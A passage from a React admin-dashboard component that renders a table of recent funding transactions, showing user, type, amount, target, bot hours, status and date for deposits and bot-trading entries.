                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* ── Transactions ── */}
      <div className="card txn-card">
        <h2 className="card-title" style={{ margin: "0 0 14px" }}>
          📊 Recent Funding Transactions
        </h2>
        {txns.length === 0 ? (
          <p
            style={{ color: "#6b7280", textAlign: "center", padding: "30px 0" }}
          >
            No transactions yet.
          </p>
        ) : (
          <div className="table-wrap table-scroll">
            <table className="admin-table">
              <thead>
                <tr>
                  {[
                    "User",
                    "Type",
                    "Amount",
                    "Target",
                    "Hours",
                    "Status",
                    "Date",
                  ].map((h) => (
                    <th key={h}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {txns.map((t) => {
                  const ls = getTxnStatus(t);
                  const colors = STATUS_COLORS[ls] || STATUS_COLORS.completed;

                  let typeLabel = t.type;
                  if (t.type === "initial_fund") {
                    typeLabel =
                      ls === "analysing"
                        ? `OmniDev Analysing (${fmtDuration(t.analysingDurationMs)})`
                        : "OmniDev Deposit";
                  } else if (t.type === "bot_trading") {
                    typeLabel = colors.label;
                  }

                  return (
                    <tr key={t.id}>
                      <td>
                        <p
                          style={{
                            color: "#fff",
                            fontSize: "12px",
                            fontWeight: 600,
                            margin: 0,
                          }}
                        >
                          {t.userName || t.userEmail}
                        </p>
                        <p
                          style={{
                            color: "#6b7280",
                            fontSize: "10px",
                            margin: 0,
                          }}
                        >
                          {t.userEmail}
                        </p>
                      </td>
                      <td>
                        <span
                          className="txn-badge"
                          style={{ background: colors.bg, color: colors.text }}
                        >
                          {typeLabel}
                        </span>
                      </td>
                      <td className="amount">
                        +${fmt(t.amount || t.initialAmount || 0)}
                      </td>
                      <td className="amount">
                        {t.targetAmount ? `$${fmt(t.targetAmount)}` : "—"}
                      </td>
                      <td className="amount">
                        {t.botHours ? `${t.botHours}h` : "—"}
                      </td>
                      <td>
                        <span
                          className="txn-badge"
                          style={{ background: colors.bg, color: colors.text }}
                        >
                          {ls}
                        </span>
                      </td>
                      <td className="date-cell">
                        {t.timestamp.toLocaleString()}
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
